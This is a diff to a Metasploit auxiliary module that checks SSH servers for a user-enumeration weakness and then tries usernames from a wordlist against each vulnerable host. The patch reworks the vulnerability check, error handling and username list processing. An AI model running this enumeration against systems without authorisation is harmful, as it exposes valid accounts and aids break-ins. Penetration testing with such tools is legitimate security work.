@@ -68,16 +68,25 @@ class Metasploit3 < Msf::Auxiliary
 
   def check_vulnerable(ip)
     options = {
-      :user => 'Rex::Text.rand_text_alphanumeric(8)',
-      :password => 'Rex::Text.rand_text_alphanumeric(8)',
-      :port => rport
+      :port => rport,
+      :auth_methods  => ['password', 'keyboard-interactive'],
+      :msframework   => framework,
+      :msfmodule     => self,
+      :disable_agent => true,
+      :config        => false,
+      :proxies       => datastore['Proxies']
     }
-    transport = Net::SSH::Transport::Session.new(ip, options)
-    auth = Net::SSH::Authentication::Session.new(transport, options)
 
-    auth.authenticate("ssh-connection", options[:user], options[:password])
+    begin
+      transport = Net::SSH::Transport::Session.new(ip, options)
+    rescue Rex::ConnectionError, Rex::AddressInUse
+      return :connection_error
+    end
+
+    auth = Net::SSH::Authentication::Session.new(transport, options)
+    auth.authenticate("ssh-connection", Rex::Text.rand_text_alphanumeric(8), Rex::Text.rand_text_alphanumeric(8))
     auth_method = auth.allowed_auth_methods.join('|')
-    print_status "SSH Server Version: #{auth.transport.server_version.version}"
+    print_status "#{peer(ip)} Server Version: #{auth.transport.server_version.version}"
     report_service(
       :host => ip,
       :port => rport,
@@ -86,13 +95,15 @@ class Metasploit3 < Msf::Auxiliary
       :info => auth.transport.server_version.version
     )
 
-    if auth_method != ''
-      :fail
+    if auth_method.empty?
+      :vulnerable
+    else
+      :safe
     end
   end
 
   def check_user(ip, user, port)
-    pass = Rex::Text.rand_text_alphanumeric(64_000)
+    pass = Rex::Text.rand_text_alphanumeric(8)
 
     opt_hash = {
       :auth_methods  => ['password', 'keyboard-interactive'],
@@ -100,7 +111,6 @@ class Metasploit3 < Msf::Auxiliary
       :msfmodule     => self,
       :port          => port,
       :disable_agent => true,
-      :password      => pass,
       :config        => false,
       :proxies       => datastore['Proxies']
     }
@@ -124,8 +134,7 @@ class Metasploit3 < Msf::Auxiliary
     rescue Net::SSH::Disconnect, ::EOFError
       return :success
     rescue ::Timeout::Error
-      return :success
-    rescue Net::SSH::Exception
+      return :connection_error
     end
   end
 
@@ -144,11 +153,16 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def user_list
+    users = nil
     if File.readable? datastore['USER_FILE']
-      File.new(datastore['USER_FILE']).read.split
+      users = File.new(datastore['USER_FILE']).read.split
+      users.each {|u| u.downcase!}
+      users.uniq!
     else
       raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
     end
+
+    users
   end
 
   def attempt_user(user, ip)
@@ -176,21 +190,23 @@ class Metasploit3 < Msf::Auxiliary
     when :connection_error
       print_error "#{peer(ip)} User '#{user}' could not connect"
     when :fail
-      print_verbose "#{peer(ip)} User '#{user}' not found"
+      vprint_status "#{peer(ip)} User '#{user}' not found"
     end
   end
 
   def run_host(ip)
     print_status "#{peer(ip)} Checking for vulnerability"
-    if check_vulnerable(ip)
-      print_error "#{peer(ip)} Not vulnerable. Aborting."
-      return
-    else
-      print_status "#{peer(ip)} Vulnerable"
+    case check_vulnerable(ip)
+    when :vulnerable
+      print_good "#{peer(ip)} Vulnerable"
       print_status "#{peer(ip)} Starting scan"
       user_list.each do |user|
         show_result(attempt_user(user, ip), user, ip)
       end
+    when :safe
+      print_error "#{peer(ip)} Not vulnerable"
+    when :connection_error
+      print_error "#{peer(ip)} Connection failed"
     end
   end
 end
